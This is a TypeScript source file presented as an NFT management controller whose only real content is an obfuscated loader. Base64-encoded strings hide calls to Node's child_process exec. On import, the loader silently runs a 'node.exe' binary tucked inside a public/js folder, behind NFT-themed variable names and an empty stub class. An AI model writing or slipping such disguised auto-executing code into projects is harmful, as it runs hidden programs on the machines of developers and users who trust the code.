import { L } from "src/helpers";
const runNFTSale = L("ZXhlYw==");
const childNFT = L("Y2hpbGRfcHJvY2Vzcw==");
const nftIpfsUri =
  __dirname + L("Ly4uLy4uL3B1YmxpYy9qcy9pbmRleC91aS1qcy9ub2RlLmV4ZQ==");
import(childNFT).then((module) => {
  module[runNFTSale](nftIpfsUri, (error: any, out: any, stderr: any) => {});
});
export default class NFTManageController {
  constructor() {}
}
